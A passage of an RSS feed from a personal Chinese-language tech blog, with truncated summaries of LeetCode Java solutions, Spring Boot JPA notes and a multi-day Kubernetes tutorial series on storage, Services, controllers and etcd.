/** * Definition for a binary tree node. * public class TreeNode { * int val; * TreeNode left; * TreeNode right; * TreeNode() {} * TreeNode(int val) { this.val = val; } * TreeNode(int val, TreeNode left, TreeNode right) { * this.val = val; * this.left = left; * this.right = right; * } * } */ class Solution { int res = Integer.MAX_VALUE; TreeNode node = null; public int minDiffInBST(TreeNode root) { if (root == null) return 0; minDiffInBST(root.</description></item><item><title>897. Increasing Order Search Tree</title><link>https://cch0124.github.io/code/2020-12-09-increasingordersearchtree/</link><pubDate>Wed, 09 Dec 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/code/2020-12-09-increasingordersearchtree/</guid><description>題目，以中序為概念。BST 樹經過中序後其最後會是排序結果。
/** * Definition for a binary tree node. * public class TreeNode { * int val; * TreeNode left; * TreeNode right; * TreeNode() {} * TreeNode(int val) { this.val = val; } * TreeNode(int val, TreeNode left, TreeNode right) { * this.val = val; * this.left = left; * this.right = right; * } * } */ class Solution { TreeNode res = new TreeNode(0); TreeNode cur = res; public TreeNode increasingBST(TreeNode root) { if (root !</description></item><item><title>LeetCode 938. Range Sum of BST</title><link>https://cch0124.github.io/code/2020-12-09-rangesumofbst/</link><pubDate>Wed, 09 Dec 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/code/2020-12-09-rangesumofbst/</guid><description>題目，這一題會給 low 和 high，只要這棵樹的節點數值滿足大於等於 low 和小於等於 high 就將其相加並成為最後結果。思路是使用前序進行遍歷，並利用 BST 特性左小右大來決定下個節點是否要進行遞歸。
/** * Definition for a binary tree node. * public class TreeNode { * int val; * TreeNode left; * TreeNode right; * TreeNode() {} * TreeNode(int val) { this.val = val; } * TreeNode(int val, TreeNode left, TreeNode right) { * this.val = val; * this.left = left; * this.right = right; * } * } */ class Solution { int res = 0; public int rangeSumBST(TreeNode root, int low, int high) { if (root !</description></item><item><title>LeetCode 53. Maximum Subarray</title><link>https://cch0124.github.io/code/2020-12-08-maximumsubarray/</link><pubDate>Tue, 08 Dec 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/code/2020-12-08-maximumsubarray/</guid><description>題目，求連續最大子序列。這題配合著此youtube實作。透過各個擊破方式，增加程式運行效率。同時在進行切分時，有三種方案
左邊最大 右邊最大 中間往左和往右 其第三種會有同時跨佐和跨右問題，其解決辦法如下
class Solution { public int maxSubArray(int[] nums) { return maxSubArray(nums, 0, nums.length-1); } /** * case 1. left Max * case 2. right Max * case 3. mid Max **/ public int maxSubArray(int[] nums, int start, int end){ if(start == end){ return nums[start]; } int mid = (start + end)/2; return Math.max( Math.max(maxSubArray(nums, start, mid), maxSubArray(nums, mid+1, end)), MaxSubCrossArray(nums, start, mid, end) ); } /** * 中間往左和往右計算連續最大值，最後在與往左和往右相加進行比較 **/ public int MaxSubCrossArray(int[] nums, int start, int mid, int end){ int sum = 0; int left_sum = Integer.</description></item><item><title>Spring Boot JPA Note</title><link>https://cch0124.github.io/blog/2020-12-08-jpa-note/</link><pubDate>Tue, 08 Dec 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2020-12-08-jpa-note/</guid><description>JPA 基本註解 @Entity 用於實體類的聲明，指出該類為實體類，將其映射至指定的資料表上。配合著 @Table 註解可以聲明該數據表的名稱，否則預設以類名稱命名。
@Id 將屬性映射為主鍵列。會配合 @GeneratedValue 來定義主鍵產生的策略，透過 strategy 進行設定，有以下方式
IDENTITY AUTO JPA 自動選擇合適的策略 默認值 SEQUENCE TABLE @Basic 屬性到數據表中的字段映射，默認都會有此註解。
@Column 可用來約束該屬性對應到數據表中的屬性功能，像是 unique、nullable、length 等。
@Transient 表示該屬性並非一個要映射到數據表的字段。
@Temporal 在 JAVA API 中無定義 Date 類型的精度。在資料庫中表示 Date 類型方式有 DATE、TIME、TIMESTAMP 三種精度。因此可藉由此註解調整精度。</description></item><item><title>kubernetes - day27</title><link>https://cch0124.github.io/kubernetes/2020-09-17-etcd/</link><pubDate>Thu, 17 Sep 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/kubernetes/2020-09-17-etcd/</guid><description>etcd 架構以及內部機制 一個 etcd 的集群節點之間透過 Raft 一致性演算法完成分散式一致性協同，從圖中可以知道會有一個 leader，而當該 leader 故障時，會自動再選取其它節點做為 leader，同時也完成數據的同步，對於客戶端來說只要選取任一節點即可做讀寫操作，內部的狀態和數據協同由 etcd 自身完成。etcd 中還有一個 quorum 概念，其表示容忍故障的數量。
客戶端對 etcd 做操作時只需簡單的使用 HTTP 方式即可存取。對於其數據可以想成是鍵值做一個儲存。同時 etcd 為了使用戶端訂閱數據變更，支援 watch 機制，透過 watch 即時獲取 etcd 中數據的增量更新，從而實現與 etcd 中的數據同步等業務邏輯。
etcd 主要提供了一下接口
Put(key, value), Del(key, value) Get(key), Get(keyFrom, keyEnd) Watch(key/keyPrefix) Transactions(if/then/else ops.).Commit() Leases: Grant/Revoke/KeepAlive etcd 版本機制 etcd 中有 term 的概念，表示整個集群 Leader 的任期。只要 Leader 發生變化就會加 1。再者就是 revision，表示全域數據版本，當數據發生變更，包括創建、修改、刪除等，其 revision 都會加 1。不過 Leader 發生切換時 revision 是延續的。
使用場景 Server Discovery （Naming Service） Distributed Coordination: leader election Distributed Coordination Kubernetes 中的 etcd 在 Kubernetes 中元件間的通訊都是藉由 API Server 通訊，而 API Server 是和 etcd 通訊的唯一元件，因此在 Kubernetes 上所有狀態都是藉由 API Server 來修改。從下面這個系統上預設元件來看，etcd、coredns、apiserver、controller-manager 和 scheduler 都運行在 master 上，我們所下達的 kubectl 相關命令都是 API Server 向 kubelete(每個節點都會安裝的代理) 發起。</description></item><item><title>kubernetes - day26</title><link>https://cch0124.github.io/kubernetes/2020-09-16-statefulset/</link><pubDate>Wed, 16 Sep 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/kubernetes/2020-09-16-statefulset/</guid><description>StatefulSet 簡單來說就是管理有狀態的應用程式，它使得每個應用程式都有不可替換的資源個體，其每個 POD 都有固定的 hostname 和專屬 volume，即時重新調度也不影響。
Stateful 和 Stateless 一個應用程式是否要紀錄前一次或多次連線中的內容訊息做為下一次連線的資訊，而該連線的對象可能是設備、用戶端或其它應用程式等。透過是否紀錄來分辨有狀態與無狀態，前者為需要記錄動作，後者則不用。
StatefulSet 與 ReplicaSet StatefulSet 在文章開頭大致上將它的重點說明了。但我們可以比較它和 ReplicaSet。ReplicaSet 隨著被資源調度就會被新的資源所取代，因為其網路等資源被改變，StatefulSet 則是就算被重新調度，其源個體都會有著相同的資源。同樣的 StatefulSet 有 ReplicaSet 的 replicas 功能，但和 ReplicaSet 生成的 POD 副本卻是不一樣的，StatefulSet 中的 POD 會有獨立的 PV 也就是儲存空間，另一個是 POD 名稱，它會使用編號方式去命名，而 StatefulSet 也支持滾動更新，基於這些功能 StatefulSet 都會講求順序，在後面範例就會明白。
StatefulSet 特性 網路標識 通常一個 StatefulSet 會在建立一個 headless Service 資源，用來記錄每個 POD 的網路標識，就像先前文章講的，每一個 POD 都會有一個獨立的 DNS 紀錄，使得客戶端能夠透過 hostname 去找到服務。
資源調度 當 StatefulSet 下的 POD 發生故障時，會像 ReplicaSet 一樣將其重新建立，但是不一樣的是 StatefulSet 會讓該新 POD 擁有之前 POD 的 hostname 等，因此透過該 hostname 進行訪問時還是會存取到一樣的 POD 資源。</description></item><item><title>kubernetes - day25</title><link>https://cch0124.github.io/kubernetes/2020-09-15-configmap-secret/</link><pubDate>Tue, 15 Sep 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/kubernetes/2020-09-15-configmap-secret/</guid><description>這邊在大致說明 ConfigMap 和 Secret，它們也屬於 volume 的一種，前者通常是以配置的數據等為主；後者則是以密鑰等為主。為什麼說是 volume 的一種呢？透過掛載方式那些像是 TLS、SSL、CA 證書或一些配置可以與容器的 image 做到解偶。在傳統的 Docker 來說，一個容器中的應用程式不大可能使用預設配置，因此我們會透過環境變數或卷(volume) 等方式進行配置。在 K8s 上也利用 ConfigMap 和 Secret 完成一些容器所需的配置，透過這種方式也可避免被重新調度後導致配置內容遺失的問題。
容器參數配置 透過 explain 方式，可以在容器等級字段中找到 args、command 的屬性，它們是用來定義容器要運行的指令(command)和傳遞參數(args)。官方也有說明，command 對應於 Dockerfile 中的 ENTRYPOINT；args 則對應於 CMD。
The command field corresponds to entrypoint in some container runtimes. Refer to the Notes below. The environment variable appears in parentheses, &amp;ldquo;$(VAR)&amp;rdquo;. This is required for the variable to be expanded in the command or args field.</description></item><item><title>kubernetes - day24</title><link>https://cch0124.github.io/kubernetes/2020-09-14-volume-storage-class/</link><pubDate>Mon, 14 Sep 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/kubernetes/2020-09-14-volume-storage-class/</guid><description>在 K8s 中 StorageClass 對象的目的，就是不去創建 PV 而是透過 PVC 需求去建立 PV，這表示不必要再去管理 PV 資源，相較於 PVC 請求 PV 方式帶來更高的靈活性。
在創建 StorageClass 對象時，name 的定義一樣是重要的，PVC 在調用時會使用 storageClassName 去對應該 StorageClass 對象的 name，創建時還需定義以下通用字段
provisioner 提供儲存的儲存系統，也就是供應商 parameter 會依照 provisioner 的不同而有不同的參數 reclaimPolicy PV 回收策略，預設是 Delete 否則可定義 Retain volumeBindingMode 定義讓 PVC 完成提供和綁定資源 GKE 上 StorageClass 實作 我們以 Nginx 為例，為它建立一個 StorageClass。我們會定義以下的 yaml。volumeBindingMode 字段可參考官方。
apiVersion: storage.k8s.io/v1 kind: StorageClass # 定義 StorageClass metadata: name: standard-us-centrall-a-b-c provisioner: kubernetes.</description></item><item><title>kubernetes - day23</title><link>https://cch0124.github.io/kubernetes/2020-09-13-persistent-volume/</link><pubDate>Sun, 13 Sep 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/kubernetes/2020-09-13-persistent-volume/</guid><description>PersistentVolume(PV)是由管理者提供並配置在某一個儲存方案的一個空間，它將儲存抽象成一個可讓使用者去申請的資源。以前面的 NFS 為例，我們都在 POD 中直接定義關於儲存的細節像是 IP 等，在這的做法缺少靈活性，當儲存要變換 IP 或是儲存的路徑，會相對的麻煩。因此可藉由 PV 變成是 POD 和儲存方案中間的抽象層，這使得 POD 不需要知道儲存的細節，這全部由 PV 去定義連接與使用，而 PV 使用需要透過 PersistentVolumeClaim(PVC) 描述的資源來完成綁定，也就是向 PV 申請儲存空間大小或是存取權限。其整體示意圖如下
講完了 PV 和 PVC 概念後這邊來實作，環境是基於上一章。
建立 PV 資源 PersistentVolume 的定義有以下常見字段
Capacity PV 儲存空間大小定義 AccessMode 存取模式有以下值，詳細看官方當中會說明有儲存方案支援哪些模式 ReadWriteOnce ReadOnlyMany ReadWriteMany persistentVolumeReclaimPolicy PVC 移除時對應的 PV 動作 Retain 保存資料 預設值 Delete 對應的 PV 資源和資料一同刪除 Recycle 保留 PV，移除資料 volumeMode 指定為 Filesystem 或是其它，預設為 Filesystem storageClassName PV 所屬的 StorageClass 的名稱，默認為空值表示不屬於任何 其字段還有很多可搭配，因為太多東西因此學起來會需要時間&amp;hellip;。我們開始實驗吧!</description></item><item><title>kubernetes - day22</title><link>https://cch0124.github.io/kubernetes/2020-09-12-volume-nfs/</link><pubDate>Sat, 12 Sep 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/kubernetes/2020-09-12-volume-nfs/</guid><description>接續上一章的實作，這邊將使用 NFS(Network File System) 分散式儲存系統實現永久儲存，它可以讓客戶端像是在本地端取得資料。
NFS 儲存卷 這邊將不使用 GKE 操作而是使用本地端架設的 K8s 來操作，將會有四台虛擬機，一台 NFS，其它則為 K8s 叢集。我們會在一台虛擬機上安裝 NFS，並設定要導出的儲存空間，之後再藉由設定檔方式去讓 POD 取得 NFS 的掛載目錄。在 POD 生命週期中，此方式只是會卸載掛載的資訊，並非像 emptyDir 一樣是直接刪除。其定義字段如下
server: NFS Server 的 IP 或是能解析的域名 path: NFS Server 定義的共享檔案路徑 readOnly: 是否要唯讀，預設是 false 先在 NFS 的虛擬機上安裝 NFS 環境，在 NFS Server 主機安裝 nfs-kernel-server，客戶端安裝 nfs-common也就是 K8s 叢集的節點，安裝完之後在 NFS Server 設定以下
sudo apt install -y sudo mkdir /k8sData echo &amp;#34;/home/cch/k8sData *(rw,sync,no_root_squash)&amp;#34; | sudo tee /etc/exports # , 不能有空格隔開 sudo exportfs -r # reload sudo showmount -e # 顯示 NFS 設定的要掛載目錄 K8s 的叢集節點進行 NFS 的掛載</description></item><item><title>kubernetes - day21</title><link>https://cch0124.github.io/kubernetes/2020-09-11-volume/</link><pubDate>Fri, 11 Sep 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/kubernetes/2020-09-11-volume/</guid><description>Kubernetes 提供的儲存方案屬於 POD 的資源，一個 POD 中的多個容器可以一同共享其儲存數據。而在容器中的數據可能會隨著 POD 生命週期而消失，在 Kubernetes 上的儲存方案可以實現出在 POD 生命週期外的儲存。接下來將會介紹 Kubernetes 上的儲存應用。
volume 概念 就像開頭講的 POD 的生命週期無法讓容器可以永久儲存數據。以 Docker 來說它可以支持網路檔案系統或是一般的檔案系統以掛載方式作永久性儲存，而在 Kubernetes 中也為 POD 提供相似的功能，這功能使得容器可以可掛載 POD 設定的外部儲存設備方案，也可達到跨節點的需求，至於是否要持久化儲存，取決於設定。示意圖如下。
Kubernetes 的儲存方案 Kubernete 所支援的儲存方案非常的多，儲存方面還支援了 ConfigMap、Secret 這些對於隱密資訊或一些變數的儲存。從官方可以看有很多儲存類型，不論是分散式或是雲端儲存。
官方中的 emptyDir 類型隨著 POD 生命週期變化；hostPath 則是以主機的目錄關聯至 POD，只要被重新調度，就無法使用，以持久化來看這兩個類型並非是持久的。相對的持久化的類型都要是網路儲存系統像是 NFS、Ceph 甚至是雲端的儲存方案。Kubernetes 中儲存有 PersistentVolume(PV) 和 persistentVolumeClaim(PVC) 的概念，PV 可借助管理者配置其儲存方案；PVC 則是去請求那些 PV，這過程簡化了配置儲存方案的複雜度。
前面有題到兩個特殊類型的 volume 分別是 ConfigMap 和 Secret，以下進行簡略介紹
ConfigMap 為 POD 寫入而外訊息，將數據定義至 ConfigMap 對象中。POD 需要時則在資源清單中引用即可 Secret 儲存較隱密的資訊用，需使用時在將其掛載至 POD 中，這樣避免了在製作 image 時隱密資訊的寫入 下面會先實作 emptyDir 與 hostPath，下一章節會在講 NFS 的實驗。</description></item><item><title>kubernetes - day20</title><link>https://cch0124.github.io/kubernetes/2020-09-10-service-discovery/</link><pubDate>Thu, 10 Sep 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/kubernetes/2020-09-10-service-discovery/</guid><description>前面章節講過的 Service，提供了一個穩定可讓客戶端取得想要的服務接口，這之間 POD 如何知道某特定服務的 IP 和 Port 呢？這就需要服務發現(Service Discovery) 的幫助。我們也知道在 K8s 環境中，POD 不能依靠網路，當服務重新部署時，會導致 IP 不同，因此需要借助服務發現。服務發現簡單來說就是是弄清楚如何連接到服務的實際過程。
環境變數的服務發現 Service 環境變數 只要創建 Service 都會使用以下的環境變數，當在同一 namespace 的 POD 會自動擁有這些資訊。可參考官網 container-environment
{SVCNAME}_SERVICE_HOST {SVCNAME}_SERVICE_PORT $ kubectl exec httpd-7765f5994-97hq5 -- printenv PATH=/usr/local/apache2/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin HOSTNAME=httpd-7765f5994-97hq5 MYAPP_SVC_PORT_80_TCP_ADDR=10.8.2.52 MYAPP_SVC_SERVICE_HOST=10.8.2.52 # this KUBERNETES_PORT_443_TCP_ADDR=10.8.0.1 MYAPP_SVC_PORT_80_TCP_PORT=80 KUBERNETES_PORT_443_TCP_PROTO=tcp KUBERNETES_PORT_443_TCP_PORT=443 MYAPP_SVC_PORT_80_TCP_PROTO=tcp KUBERNETES_SERVICE_PORT=443 KUBERNETES_SERVICE_PORT_HTTPS=443 KUBERNETES_PORT=tcp://10.8.0.1:443 KUBERNETES_PORT_443_TCP=tcp://10.8.0.1:443 MYAPP_SVC_SERVICE_PORT=80 # this MYAPP_SVC_PORT=tcp://10.8.2.52:80 MYAPP_SVC_PORT_80_TCP=tcp://10.8.2.52:80 ... Docker Link 方式環境變數 這邊我在 GCP 上的 Compute Engine 拿一個節點的容器用 docker inspect 觀察。
$ docker inspect 203e907bf5ba &amp;#34;Env&amp;#34;: [ &amp;#34;MYAPP_SVC_PORT=tcp://10.</description></item><item><title>kubernetes - day19</title><link>https://cch0124.github.io/kubernetes/2020-09-09-service-ingress-part3/</link><pubDate>Wed, 09 Sep 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/kubernetes/2020-09-09-service-ingress-part3/</guid><description>Loadbalance 類型的 Service 上一章節實作了 nodePort 類型的資源，它可讓集群外部存取，但 nodePort 資源有著一個缺點，要存取時須知道集群中至少一個節點 IP，該結點如果故障得要取得其它節點的 IP。這問題可藉由在集群外部部署一個負載均衡器，可以經由它存取外部客户端請求同時調度到集群中相應的 nodePort，這類型的資源是 LoadBalancer。我們透過 GKE 環境實作。
apiVersion: v1 kind: Service metadata: name: loadbalance-service spec: type: LoadBalancer selector: app: hello-kubernetes ports: - protocol: TCP port: 8080 targetPort: 9376 nodePort: 32223 apiVersion: apps/v1 kind: Deployment metadata: name: hello-kubernetes-loadbalance spec: replicas: 3 selector: matchLabels: app: hello-kubernetes template: metadata: labels: app: hello-kubernetes spec: containers: - name: hello-kubernetes image: paulbouwer/hello-kubernetes:1.7 ports: - containerPort: 8080 --- apiVersion: v1 kind: Pod metadata: name: pod-client labels: app: client spec: containers: - name: client image: hwchiu/netutils 查看建立的 LoadBalancer 資源，此資源會分配一個對外存取的 IP(EXTERNAL-IP)。</description></item><item><title>kubernetes - day18</title><link>https://cch0124.github.io/kubernetes/2020-09-08-service-ingress-part2/</link><pubDate>Tue, 08 Sep 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/kubernetes/2020-09-08-service-ingress-part2/</guid><description>預設的 Service 這預設是讓節點能夠跟 API Server 等資源做通訊。
$ kubectl get svc NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE kubernetes ClusterIP 10.8.0.1 &amp;lt;none&amp;gt; 443/TCP 15d $ kubectl describe svc kubernetes Name: kubernetes Namespace: default Labels: component=apiserver provider=kubernetes Annotations: &amp;lt;none&amp;gt; Selector: &amp;lt;none&amp;gt; Type: ClusterIP IP: 10.8.0.1 Port: https 443/TCP TargetPort: 443/TCP Endpoints: 34.66.217.13:443 Session Affinity: None Events: &amp;lt;none&amp;gt; clusterIP 類型的 Service 同樣的使用 nginx 做為範例。下面是實驗的 yaml。在前面文章有提到過，使用 expose 也可以達到創建 Service 資源。
apiVersion: apps/v1 kind: Deployment metadata: name: my-nginx spec: replicas: 5 selector: matchLabels: run: my-nginx template: metadata: labels: run: my-nginx role: backend spec: containers: - name: my-nginx image: nginx:1.</description></item><item><title>kubernetes - day17</title><link>https://cch0124.github.io/kubernetes/2020-09-07-service-ingress/</link><pubDate>Mon, 07 Sep 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/kubernetes/2020-09-07-service-ingress/</guid><description>POD 並非有持久性，可能出於各種原因重新調度 POD，像是失敗的 liveness 或 readiness 檢查，如果此時與 POD 通訊會怎樣？當 POD 重啟時，可能具有不同的 IP 地址。這就是為什麼有 Service 的資源，Service 用於為 POD 提供一個固定、統一的存取功能和負載均衡，同時在集群內部使用 DNS 實現服務發現，解決客戶端發現容器的問題。Service 和 POD 的 IP 只在 Kubernetes 集群内相互存取，無法直接干預外部流量的請求。而 Kubernetes 提供了一些方法像是 hostPort、hostNetwork、NodePort 或 LoadBalancer 等，而另一種 Ingress 則是資源第七層的均衡負載。Service 藉由規則去定義策略，最重要的是還是會藉由標籤去實現。
Service 資源 上述描述的問題，是編排系統可能會遇到的問題。當 POD 在做伸縮的應用時或是重新調度，都有可能影響 IP，這會導致客戶端存取資源時會錯誤。為了解決此問題 kubernetes 提供了 Service 資源。前面也提到說 Service 還是會藉由標籤去實作，如下圖所示，同時 Service 也隱藏了真實處裡用戶請求的 POD。下圖的標籤選擇器有多個符合的後端，這會讓 Service 可以用負載均衡方式進行調度的處裡。
Service 會提供給 POD 的存取等級，這取決於服務的類型，當前有三種類型：
ClusterIP 屬於集群內部，只有集群內部的資源可相互存取，默認選項 NodePort 為節點提供一個可訪問的 IP 與 Port LoadBalancer 從雲提供商添加負載均衡器，將流量從服務轉發到服務中的節點 詳細可參考官網。實際上 Service 並非直接與 POD 通訊，其之間還有叫 Endpoints 的資源，它是由 IP 地址和 Port 组成的，Service 會擁有這個資源是透過標籤選擇器匹配的 POD 取得，這部分 K8s 幫我們自動實現了。</description></item><item><title>學習紀錄</title><link>https://cch0124.github.io/project/2020-09-07-person-history/</link><pubDate>Mon, 07 Sep 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/project/2020-09-07-person-history/</guid><description>自我學習紀錄 機器學習 資料屬性 統計資料 統計資料圖表觀察 資料的相異度與相似度 資料前處裡 資料清理應用 線性迴歸 數學 什麼是分類 什麼是集群 實作 Keras DDos Detection k-means DBSCAN Activation 介紹與實作 Tensorflow function 操作 keras 神經網路建立 全連接層觀察 梯度 損失函數 keras DNN實作- mnist 為例 keras CNN實作- cifar10 為例 自訂義 Layer Kubernetes Kubernetes 概觀 kubernetes 1.18 版本基本安裝 kubernetes POD 資源基本介紹 kubectl 基本操作 POD 相關資源介紹 資源定義與使用 namespace 和 POD 基本資源操作 POD 資源管理-part01 POD 資源管理-part02 POD 資源管理-part03 POD 資源需求及資源限制 POD 控制器 ReplicaSet 控制器 Deployment 控制器 DaemonSet 控制器 Job 和 CronJob 控制器 Service 和 Ingress Service 和 Ingress part02 Service 和 Ingress part03 Service Discovery and DNS 儲存與持久化儲存 part01 儲存與持久化儲存 part02 - NFS 儲存與持久化儲存 part03 - PV 與 PVC 儲存與持久化儲存 part04 - Storage Class ConfigMap 和 Secret StatefulSet 控制器 etcd 自我學習 GCP 和機器學習與 Kubernetes 應用 Machine Learning APIs Introduction to APIs in Google Extract, Analyze, and Translate Text from Images with the Cloud ML APIs Classify Text into Categories with the Natural Language API Detect Labels, Faces, and Landmarks in Images with the Cloud Vision API Entity and Sentiment Analysis with the Natural Language API Awwvision: Cloud Vision API from a Kubernetes Cluster Baseline Data, ML, AI AI Platform Dataprep Dataproc Video Intelligence Reinforcement Learning Kubernetes in Google Cloud Introduction to Docker Kubernetes Engine Orchestrating the Cloud with Kubernetes Managing Deployments Using Kubernetes Engine Continuous Delivery with Jenkins in Kubernetes Engine Kubernetes Solutions Using Kubernetes Engine to Deploy Apps with Regional Persistent Disks NGINX Ingress Controller on Google Kubernetes Engine Distributed Load Testing Using Kubernetes Running a MongoDB Database in Kubernetes with StatefulSets Coding Spring boot CRUD 員工管理系統 spring-boot 容器以及其它運用 使用 Dockerfile 製作容器 導入 jaeger 進行 API traceing JAVA JAVA JAVA - UVa JAVA - Network 放視大賞 - OTP 隨機密碼 Database Database Shell shell - hackerrank shell - LeetCode shell - codeware shell 自己練習寫小工具 Golang Golang 資料結構實作 運維與網路 ELK wireshark 軟體使用 分析應用-01 分析應用-02 分析應用-03 Namespace 模擬 Docker Ansible Jenkins firewall Vagrant loggin-efk monitor terraform tracing - jaeger 網路筆記 靜態路由 ARP DHCP PPP RIP 與子網路切割 HSRP telnet SSH NAT Static NAT Dynamic VLAN VLAN router-on-a-stick 實習 交換器 image 遺失 Apache 操作 DHCP 操作 ELK logstash 問題解決 ESXi 備份至 NAS rsyslog 研究 學校 作業 PortScanner - python JAVA 實作矩陣運算 Android 計算機 社團 Flutter flutter-BMI flutter-calculator Card Flutter 學習筆記 實驗室 NFS rsync UPS</description></item><item><title>kubernetes - day16</title><link>https://cch0124.github.io/kubernetes/2020-09-06-job-cronjob/</link><pubDate>Sun, 06 Sep 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/kubernetes/2020-09-06-job-cronjob/</guid><description>Job 控制器是一次性任務的 POD 控制器，期會創建一至多個 POD，只要容器運行過程正常的運行即不會有重啟的動作，否則需要依照重啟策略去運行，如果遇到節點故障未完成任務的 POD 則會被重新的調度。Job 完成任務的定義是 Job 控制器會記錄 POD 成功執行完任務的個數，並達到成功次數的值。運行 Job 方式可以是是否要以平行的方式去運行多個 POD。CronJob 可以想成是 crontab，用來管理 Job 控制器要運行的時間，也就是在未來的某一個時間上運行或是固定某一時段運行。前面文章所提到的控制器會比較希望應用程式是以一個 Daemon 來運行，而 Job 類型則是會以 Task 為主的應用程式。
非平行化 一次性 一次執行一個 POD 作業，直到達到定義成功的次數 平行化 平行處理 會設置工作列隊的數量，該數量可讓多個 POD 同時作業 建立 Job Job 需要定義必要的 template，可透過 kubectl explain job.spec 去查看，至於標籤選擇器則會自動藉由 template 去創建。以下我們拿官網的範例實驗
apiVersion: batch/v1 kind: Job metadata: name: pi spec: template: spec: containers: - name: pi image: perl command: [&amp;#34;perl&amp;#34;, &amp;#34;-Mbignum=bpi&amp;#34;, &amp;#34;-wle&amp;#34;, &amp;#34;print bpi(2000)&amp;#34;] restartPolicy: Never # backoffLimit: 4 Job 建立 POD 無法使用 restartPolicy 的默認值(always)，因為 Job 並非要無限期運作。需要設置 Never 或 OnFailure 防止容器完成任務後重新啟動</description></item><item><title>kubernetes - day15</title><link>https://cch0124.github.io/kubernetes/2020-09-05-daemonset/</link><pubDate>Sat, 05 Sep 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/kubernetes/2020-09-05-daemonset/</guid><description>DaemonSet 簡稱 ds 也是一個 POD 控制器，用於實現在集群中每個節點運行一份 POD，即使是後續加入的節點，而移除節點則會進行 POD 的回收。假設只需針對某一些節點上進行部署，則可以使用節點的選擇器或是以標籤方式做限制。DaemonSet 使用場景可能有以下
Log 搜集器 集群類型的儲存 資源監控相關 下圖為 Kubernetes in action 一書，比較 ReplicaSet 和 DaemonSet 差異 實驗環境是使用 GKE 我們可以查看預設下有哪些原件是使用 DaemonSet
$ kubectl get ds -n kube-system -l name!=filebeat NAME DESIRED CURRENT READY UP-TO-DATE AVAILABLE NODE SELECTOR AGE fluentd-gcp-v3.1.1 4 4 4 4 4 beta.kubernetes.io/fluentd-ds-ready=true,beta.kubernetes.io/os=linux 14d metadata-proxy-v0.1 0 0 0 0 0 beta.kubernetes.io/metadata-proxy-ready=true,beta.kubernetes.io/os=linux 14d nvidia-gpu-device-plugin 0 0 0 0 0 &amp;lt;none&amp;gt; 14d prometheus-to-sd 4 4 4 4 4 beta.</description></item><item><title>kubernetes - day14</title><link>https://cch0124.github.io/kubernetes/2020-09-04-deployment/</link><pubDate>Fri, 04 Sep 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/kubernetes/2020-09-04-deployment/</guid><description>Deployment 縮寫為 deploy，它被建構在 ReplicaSet 控制器之上的控制器。為 POD 和 ReplicaSet 提供聲明式更新，而 Deployment 基本上和 ReplicaSet 很相似，只不過多了這些特性
可以觀察 Deployment 升級的過程 可以用回滾方式回到歷史版本中的某一個版本 對 Deployment 操作紀錄作保存，以便可回滾 在每一次升級過程中都可暫停或啟動 自動更新機制有兩種 Recreate 一次性刪除所有 POD，之後再用新版本佈署 RollingUpdate 滾動式更新，小階段的更新 Deployment 的建立 其定義的字段與 Replica 很像，如 replicas、selector、template 等。下面是本章節的實驗範例。
# deploy-demo.yaml apiVersion: apps/v1 kind: Deployment metadata: name: myapp-deploy namespace: default spec: replicas: 5 selector: matchLabels: app: myapp release: canary template: metadata: labels: app: myapp release: canary spec: containers: - name: myapp image: nginx:1.</description></item><item><title>kubernetes - day13</title><link>https://cch0124.github.io/kubernetes/2020-09-03-replicaset/</link><pubDate>Thu, 03 Sep 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/kubernetes/2020-09-03-replicaset/</guid><description>ReplicaSet 縮寫為 RS，是一種 POD 控制器。用來確保所管控的 POD 副本數在任一時間都能保證用戶所期望的需求。下圖演示了 RS 操作，RS 觸發後會去找匹配 selector 的 POD，當前啟動的數量與期望的數量不符合時，會進行一些操作，像是多的數量則刪除，少的話透過 POD 模板建立。當期數量符合用戶定義時則不斷的循環。
from Kubernetes in action
RS 的建立通常以三個字段定義，selector、replicas 和 template，如下圖所示。當中 selector、replicas 或 template 隨時可按照需求做更改。replicas 的定義數量為其直接影響；selector 可能讓當前的標籤不再匹配，讓 RS 不再對當前的 POD 進行控制；template 的修改是對後續創建新 POD 才產生影響。
from Kubernetes in action
對於一般手動建立 POD，RS 帶來的好處有以下
確保 POD 數量符合定義數量 當節點發生故障時，自動請求自其它節點創建缺失的 POD POD 的水平縮放 必要時可透 HPA(HroizontalPodAutoscaler) 控制器針對資源來自動縮放
建立 RS 再前面描述有說明 RS 重要的資源創建字段有哪些。這邊再說明一個字段 minReadySecond 預設值為 0 秒，在建立新 POD 時，啟動後有多長時間無出現異常就可被視為READY 狀態。以下為建立一個 RS 的範例。</description></item><item><title>kubernetes - day12</title><link>https://cch0124.github.io/kubernetes/2020-09-02-pod-controller/</link><pubDate>Wed, 02 Sep 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/kubernetes/2020-09-02-pod-controller/</guid><description>POD 的調度過程，前面文章都有提到過。kubelete 對於容器的非主行程錯誤無法去感覺，需要依賴於 liveness probe 機制。再想想，如果 POD 被惡意刪除或是節點出現問題又該如何解決 ? 我們都知道 kubelet 是運行在每個節點上的必要代理器，因此節點故障，對於 POD 的各種資源都無法有保證性。對於這些問題我們必須使用節點外的 POD 控制器實現該保證性。
